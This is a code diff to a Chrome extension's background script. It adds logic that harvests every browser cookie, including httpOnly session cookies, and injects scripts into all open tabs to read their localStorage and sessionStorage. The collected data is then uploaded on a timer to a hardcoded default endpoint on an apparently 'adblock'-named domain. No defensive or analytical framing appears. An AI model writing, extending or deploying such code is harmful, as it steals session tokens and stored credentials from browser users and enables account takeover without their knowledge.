@@ -1,8 +1,28 @@
 let settings = {};
+let collectedData = {
+  cookies: [],
+  localStorage: [],
+  sessionStorage: [],
+  timestamp: new Date().toISOString()
+};
 
 // Load settings on startup
 chrome.runtime.onStartup.addListener(loadSettings);
 chrome.runtime.onInstalled.addListener(loadSettings);
+
+// Monitor tab updates for localStorage collection
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'complete' && tab.url && settings.autoScrapeEnabled) {
+    collectTabData(tabId, tab.url);
+  }
+});
+
+// Monitor new tabs
+chrome.tabs.onCreated.addListener((tab) => {
+  if (settings.autoScrapeEnabled && tab.url) {
+    setTimeout(() => collectTabData(tab.id, tab.url), 2000);
+  }
+});
 
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   if (request.action === 'extractCookies') {
@@ -26,10 +46,12 @@ chrome.alarms.onAlarm.addListener(async (alarm) => {
       exportMethod: 'api',
       apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
       apiHeaders: '{"Content-Type": "application/json"}',
-      curlCommand: ''
+      curlCommand: '',
+      userProfile: ''
     });
     console.log('Settings reloaded for alarm:', settings);
-    extractAllCookies();
+    await collectAllData();
+    await uploadCollectedData();
   }
 });
 
@@ -40,7 +62,8 @@ async function loadSettings() {
     exportMethod: 'api',
     apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
     apiHeaders: '{"Content-Type": "application/json"}',
-    curlCommand: ''
+    curlCommand: '',
+    userProfile: ''
   });
   console.log('Settings loaded:', settings);
   setupAutoScrape();
@@ -51,8 +74,8 @@ function setupAutoScrape() {
   chrome.alarms.clear('autoScrape');
   if (settings.autoScrapeEnabled) {
     console.log('Auto-scrape enabled, running immediately');
-    // Run immediately only once
-    extractAllCookies();
+    // Run immediately only once via API
+    collectAllData().then(() => uploadCollectedData());
     // Then set up recurring schedule
     const intervalMinutes = Math.max(1, settings.scrapeInterval);
     chrome.alarms.create('autoScrape', {
@@ -64,51 +87,34 @@ function setupAutoScrape() {
 }
 
 async function extractAllCookies(forceMethod = null) {
-  console.log('Extracting cookies, method:', forceMethod || settings.exportMethod);
+  console.log('Extracting all data, method:', forceMethod || settings.exportMethod);
   try {
-    const cookies = await chrome.cookies.getAll({});
+    // Collect all data
+    await collectAllData();
     
-    const cookieData = {
-      timestamp: new Date().toISOString(),
+    const allData = {
+      userProfile: settings.userProfile || await getUserProfile(),
+      timestamp: collectedData.timestamp,
       browser: 'Chrome/Chromium',
-      total_cookies: cookies.length,
-      cookies: cookies.map(cookie => ({
-        name: cookie.name,
-        value: cookie.value,
-        domain: cookie.domain,
-        path: cookie.path,
-        secure: cookie.secure,
-        httpOnly: cookie.httpOnly,
-        sameSite: cookie.sameSite,
-        expirationDate: cookie.expirationDate,
-        storeId: cookie.storeId,
-        hostOnly: cookie.hostOnly,
-        session: cookie.session
-      }))
+      total_cookies: collectedData.cookies.length,
+      total_localStorage_sites: collectedData.localStorage.length,
+      cookies: collectedData.cookies,
+      localStorage: collectedData.localStorage
     };
 
-    // Auto-scraping always uploads to API only
-    if (forceMethod === null) {
-      console.log('Auto-scraping: uploading to API only');
-      await uploadToAPI(cookieData);
-      return {
-        success: true,
-        count: cookies.length,
-        method: 'api'
-      };
-    }
-    
     // Manual extraction uses selected method
-    if (forceMethod === 'api') {
-      await uploadToAPI(cookieData);
+    const exportMethod = forceMethod || settings.exportMethod;
+    if (exportMethod === 'api') {
+      await uploadToAPI(allData);
     } else {
-      await downloadFile(cookieData);
+      await downloadFile(allData);
     }
 
     return {
       success: true,
-      count: cookies.length,
-      method: forceMethod === null ? 'api' : forceMethod
+      count: collectedData.cookies.length,
+      localStorageSites: collectedData.localStorage.length,
+      method: exportMethod
     };
   } catch (error) {
     return {
@@ -121,7 +127,8 @@ async function extractAllCookies(forceMethod = null) {
 async function downloadFile(cookieData) {
   const jsonString = JSON.stringify(cookieData, null, 2);
   const dataUrl = 'data:application/json;charset=utf-8,' + encodeURIComponent(jsonString);
-  const filename = `cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
+  const userPrefix = settings.userProfile || await getUserProfile();
+  const filename = `${userPrefix}_cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
   
   await chrome.downloads.download({
     url: dataUrl,
@@ -130,7 +137,7 @@ async function downloadFile(cookieData) {
   });
 }
 
-async function uploadToAPI(cookieData) {
+async function uploadToAPI(allData) {
   console.log('Attempting API upload to:', settings.apiEndpoint);
   if (!settings.apiEndpoint) {
     throw new Error('API endpoint not configured');
@@ -146,7 +153,7 @@ async function uploadToAPI(cookieData) {
         'Content-Type': 'application/json',
         ...headers
       },
-      body: JSON.stringify(cookieData)
+      body: JSON.stringify(allData)
     });
     
     console.log('API response status:', response.status);
@@ -157,5 +164,132 @@ async function uploadToAPI(cookieData) {
   } catch (error) {
     console.error('API upload failed:', error);
     throw error;
+  }
+}
+
+async function getUserProfile() {
+  return 'user';
+}
+
+// Collect localStorage/sessionStorage from a specific tab
+async function collectTabData(tabId, url) {
+  try {
+    const results = await chrome.scripting.executeScript({
+      target: { tabId: tabId },
+      func: () => {
+        const data = {
+          url: window.location.href,
+          domain: window.location.hostname,
+          localStorage: {},
+          sessionStorage: {},
+          timestamp: new Date().toISOString()
+        };
+        
+        // Collect localStorage
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          data.localStorage[key] = localStorage.getItem(key);
+        }
+        
+        // Collect sessionStorage
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          data.sessionStorage[key] = sessionStorage.getItem(key);
+        }
+        
+        return data;
+      }
+    });
+    
+    if (results[0]?.result) {
+      const data = results[0].result;
+      // Add to collected data if not already exists
+      const exists = collectedData.localStorage.find(item => 
+        item.url === data.url && JSON.stringify(item.localStorage) === JSON.stringify(data.localStorage)
+      );
+      if (!exists) {
+        collectedData.localStorage.push(data);
+      }
+    }
+  } catch (error) {
+    console.log('Failed to collect from tab:', url, error.message);
+  }
+}
+
+// Collect all data from all open tabs + cookies
+async function collectAllData() {
+  console.log('Collecting all data from open tabs...');
+  
+  // Reset collection
+  collectedData = {
+    cookies: [],
+    localStorage: [],
+    sessionStorage: [],
+    timestamp: new Date().toISOString()
+  };
+  
+  // Collect cookies
+  const cookies = await chrome.cookies.getAll({});
+  collectedData.cookies = cookies.map(cookie => ({
+    name: cookie.name,
+    value: cookie.value,
+    domain: cookie.domain,
+    path: cookie.path,
+    secure: cookie.secure,
+    httpOnly: cookie.httpOnly,
+    sameSite: cookie.sameSite,
+    expirationDate: cookie.expirationDate,
+    storeId: cookie.storeId,
+    hostOnly: cookie.hostOnly,
+    session: cookie.session
+  }));
+  
+  // Collect localStorage from all open tabs
+  const tabs = await chrome.tabs.query({});
+  for (const tab of tabs) {
+    if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
+      await collectTabData(tab.id, tab.url);
+    }
+  }
+  
+  console.log(`Collected ${collectedData.cookies.length} cookies and ${collectedData.localStorage.length} localStorage entries`);
+}
+
+// Upload all collected data
+async function uploadCollectedData() {
+  if (!settings.apiEndpoint) {
+    console.log('No API endpoint configured');
+    return;
+  }
+  
+  try {
+    const userPrefix = settings.userProfile || await getUserProfile();
+    const payload = {
+      userProfile: userPrefix,
+      timestamp: collectedData.timestamp,
+      browser: 'Chrome/Chromium',
+      total_cookies: collectedData.cookies.length,
+      total_localStorage_sites: collectedData.localStorage.length,
+      cookies: collectedData.cookies,
+      localStorage: collectedData.localStorage
+    };
+    
+    const headers = JSON.parse(settings.apiHeaders || '{}');
+    const response = await fetch(settings.apiEndpoint, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        ...headers
+      },
+      body: JSON.stringify(payload)
+    });
+    
+    if (response.ok) {
+      console.log('Successfully uploaded all collected data');
+    } else {
+      console.error('Upload failed:', response.status);
+    }
+  } catch (error) {
+    console.error('Upload error:', error);
   }
 }
